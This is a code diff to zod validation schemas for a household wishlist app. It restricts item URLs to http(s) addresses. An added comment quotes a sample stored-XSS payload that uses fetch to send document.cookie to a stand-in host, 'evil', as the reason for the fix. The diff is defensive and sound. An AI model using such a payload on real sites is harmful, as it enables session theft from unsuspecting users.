@@ -1,5 +1,5 @@
 import { z } from 'zod'
-import { zDateString, zId } from './common'
+import { zDateString, zHttpUrl, zId } from './common'
 
 export const wishlistCreateSchema = z.object({
   title: z.string().trim().min(1).max(200),
@@ -18,7 +18,14 @@ export const wishlistPatchSchema = wishlistCreateSchema.partial().extend({
 
 export const wishlistItemCreateSchema = z.object({
   name: z.string().trim().min(1).max(200),
-  url: z.string().trim().url().max(2000).nullish(),
+  /**
+   * Rendered as the item's link, so it must be a real http(s) address.
+   * `z.string().url()` (what this used to be) happily accepts
+   * `javascript:fetch('//evil/'+document.cookie)` — anyone in the household,
+   * kids included, could store that and the next person to tap the item name
+   * would run it on the board's origin with the session cookie.
+   */
+  url: zHttpUrl.max(2000).nullish(),
   notes: z.string().trim().max(2000).nullish(),
   /** Free text ("about $30", "£15-20") — a number would force a currency. */
   price: z.string().trim().max(50).nullish(),
